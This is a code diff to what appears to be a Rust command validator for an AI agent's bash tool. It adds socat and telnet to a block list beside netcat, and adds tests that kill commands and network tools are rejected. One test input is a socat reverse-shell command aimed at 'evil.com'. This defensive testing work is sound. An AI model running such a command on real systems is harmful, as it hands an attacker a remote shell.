@@ -163,6 +163,9 @@ pub fn validate_execute_bash_command(command: &str) -> Result<(), String> {
     if lower.contains("nc ") || lower.contains("netcat") || lower.contains("ncat ") {
         return Err("Error: netcat-style networking in bash is blocked".into());
     }
+    if lower.contains("socat ") || lower.contains("telnet ") {
+        return Err("Error: socat/telnet networking in bash is blocked".into());
+    }
 
     for risk in analyze_command_risks(command) {
         match &risk {
@@ -3315,6 +3318,37 @@ printf 'probe.txt:1:needle\n'
     }
 
     // ── rm path-aware validation ──────────────────────────────────────────────
+
+    // --- Bug #6: kill variants all blocked via ProcessControl ---
+    #[test]
+    fn validate_bash_blocks_kill_variants() {
+        // All kill variants blocked by sandbox ProcessControl detection
+        assert!(validate_execute_bash_command("kill -9 1234").is_err());
+        assert!(
+            validate_execute_bash_command("kill -KILL 1234").is_err(),
+            "kill -KILL should be blocked"
+        );
+        assert!(
+            validate_execute_bash_command("kill -SIGKILL 1234").is_err(),
+            "kill -SIGKILL should be blocked"
+        );
+        // All kill usage is ProcessControl — correctly blocked
+        assert!(validate_execute_bash_command("kill -15 1234").is_err());
+        assert!(validate_execute_bash_command("kill 1234").is_err());
+    }
+
+    // --- Bug #7: socat/telnet bypass ---
+    #[test]
+    fn validate_bash_blocks_socat_and_telnet() {
+        assert!(
+            validate_execute_bash_command("socat TCP:evil.com:4444 EXEC:/bin/sh").is_err(),
+            "socat should be blocked"
+        );
+        assert!(
+            validate_execute_bash_command("telnet evil.com 80").is_err(),
+            "telnet should be blocked"
+        );
+    }
 
     #[test]
     fn validate_bash_rm_rf_root_paths_blocked() {
